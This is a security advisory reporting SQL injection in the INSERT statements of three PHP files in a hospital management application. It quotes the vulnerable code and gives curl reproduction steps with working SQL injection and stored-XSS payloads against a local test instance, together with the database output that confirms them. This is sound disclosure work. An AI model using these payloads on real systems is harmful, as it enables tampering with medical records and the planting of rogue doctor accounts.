### Title

SQL injection in `prescribe.php`, `func2.php`, and `admin-panel1.php` allows arbitrary inserts and database content manipulation

### Summary

Prescriptions, patient registrations, and doctor accounts are created by string concatenation in INSERT statements. Because the input fields are placed directly inside single-quoted SQL literals without parameter binding, an attacker who can reach these endpoints can break out of the literal, append additional columns, or evaluate subqueries. The `dpassword` field on `admin-panel1.php` was used to write `SELECT user()` (`root@localhost`) into the `doctb` table, demonstrating database-side execution. The same technique applies to `disease`, `allergy`, and `prescription` on `prescribe.php`.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

SQL Injection (CWE-89)

### Affected Code

File: `prescribe.php`

```php
$query=mysqli_query($con,"insert into prestb(doctor,pid,ID,fname,lname,appdate,apptime,disease,allergy,prescription) values ('$doctor','$pid','$ID','$fname','$lname','$appdate','$apptime','$disease','$allergy','$prescription')");
```

File: `func2.php`

```php
$query="insert into patreg(fname,lname,gender,email,contact,password,cpassword) values ('$fname','$lname','$gender','$email','$contact','$password','$cpassword');";
$result=mysqli_query($con,$query);
```

File: `admin-panel1.php`

```php
$query="insert into doctb(username,password,email,spec,docFees)values('$doctor','$dpassword','$demail','$spec','$docFees')";
$result=mysqli_query($con,$query);
```

### Root Cause

The INSERT statements are built by string concatenation. `$_POST['disease']`, `$_POST['allergy']`, `$_POST['prescription']`, `$_POST['fname']`, `$_POST['lname']`, `$_POST['email']`, `$_POST['contact']`, `$_POST['password']`, `$_POST['cpassword']`, `$_POST['doctor']`, `$_POST['dpassword']`, `$_POST['demail']`, `$_POST['special']`, and `$_POST['docFees']` are inserted into single-quoted SQL literals without sanitisation, parameter binding, or stored-procedure indirection.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Exploit `prescribe.php` to create a prescription whose `disease` column contains a synthetic script payload.

```bash
curl -sS "$BASE_URL/prescribe.php" \
  --data-urlencode "prescribe=1" \
  --data-urlencode "pid=4" \
  --data-urlencode "ID=1" \
  --data-urlencode "fname=test" \
  --data-urlencode "lname=test" \
  --data-urlencode "appdate=2020-01-01" \
  --data-urlencode "apptime=10:00:00" \
  --data-urlencode "disease=<script>alert(1)</script>" \
  --data-urlencode "allergy=<img src=x onerror=alert(2)>" \
  --data-urlencode "prescription=<svg/onload=alert(3)>"
```

Observed response:

```text
<script>alert('Prescribed successfully!');</script>
```

3. Confirm that the injected values are stored verbatim in `prestb`:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT disease,allergy,prescription FROM prestb ORDER BY ID DESC LIMIT 1;"
```

```text
disease                            allergy                          prescription
<script>alert(1)</script>           <img src=x onerror=alert(2)>     <svg/onload=alert(3)>
```

4. Exploit `admin-panel1.php` doctor-add to evaluate `SELECT user()` inside the `password` column.

```bash
curl -sS "$BASE_URL/admin-panel1.php" \
  --data-urlencode "docsub=1" \
  --data-urlencode "doctor=test" \
  --data-urlencode "dpassword=t'+(SELECT user())+'" \
  --data-urlencode "demail=other2@other.com" \
  --data-urlencode "special=test" \
  --data-urlencode "docFees=1"
```

5. Confirm the database now contains a row whose `password` is the result of `user()`:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT username,password FROM doctb ORDER BY email DESC LIMIT 5;"
```

```text
username  password
Tiwary    tiwary123
test      root@localhost
Kumar     kumar123
Ganesh    ganesh123
Dinesh    dinesh123
```

6. The same concatenation pattern applies to `func2.php` (patient registration), allowing arbitrary rows to be added with attacker-controlled data:

```bash
curl -sS "$BASE_URL/func2.php" \
  --data-urlencode "patsub1=1" \
  --data-urlencode "fname=<script>alert(1)</script>" \
  --data-urlencode "lname=<img src=x onerror=alert(2)>" \
  --data-urlencode "gender=Male" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "contact=1234567890" \
  --data-urlencode "password=test123" \
  --data-urlencode "cpassword=test123"
```

### Impact

An unauthenticated attacker (no session is required to reach these endpoints) can write arbitrary rows into `prestb`, `patreg`, and `doctb`. Beyond the obvious data-integrity issue, the same primitive enables stored XSS payloads (because the inserted values are echoed back unescaped in `doctor-panel.php` and `admin-panel1.php`), database-side execution (via subqueries), and persistent doctor accounts that the operator will then trust. The same logic applies to any other INSERT/UPDATE statement built by string concatenation in the codebase, including the `update appointmenttb set payment='$status' where contact='$contact'` statements in `func.php`, `func3.php`, and `newfunc.php`.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
Score: 9.1 (Critical)
```
